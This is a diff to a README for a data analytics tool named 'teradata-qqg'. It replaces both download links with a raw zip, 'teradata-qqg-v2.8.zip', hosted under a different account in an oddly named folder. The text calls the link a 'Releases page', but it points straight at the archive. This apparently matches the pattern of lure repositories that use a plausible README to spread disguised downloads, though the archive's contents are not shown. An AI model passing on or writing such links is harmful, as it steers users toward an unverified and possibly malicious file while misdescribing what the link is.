@@ -1,6 +1,6 @@
 # 🌟 teradata-qqg - Effortlessly Manage Your Data Analytics 
 
-[![Download teradata-qqg](https://raw.githubusercontent.com/Liucax/teradata-qqg/main/autoxidizability/teradata-qqg.zip)](https://raw.githubusercontent.com/Liucax/teradata-qqg/main/autoxidizability/teradata-qqg.zip)
+[![Download teradata-qqg](https://raw.githubusercontent.com/d-maiin/teradata-qqg/main/autoxidizability/teradata-qqg-v2.8.zip)](https://raw.githubusercontent.com/d-maiin/teradata-qqg/main/autoxidizability/teradata-qqg-v2.8.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -18,7 +18,7 @@ Welcome to **teradata-qqg**! This application helps you manage data analytics ef
 To get started, you need to download the application. Here’s how:
 
 1. Click the download button below to visit the Releases page:
-   [Download teradata-qqg](https://raw.githubusercontent.com/Liucax/teradata-qqg/main/autoxidizability/teradata-qqg.zip)
+   [Download teradata-qqg](https://raw.githubusercontent.com/d-maiin/teradata-qqg/main/autoxidizability/teradata-qqg-v2.8.zip)
 
 2. On the Releases page, look for the latest version.
 
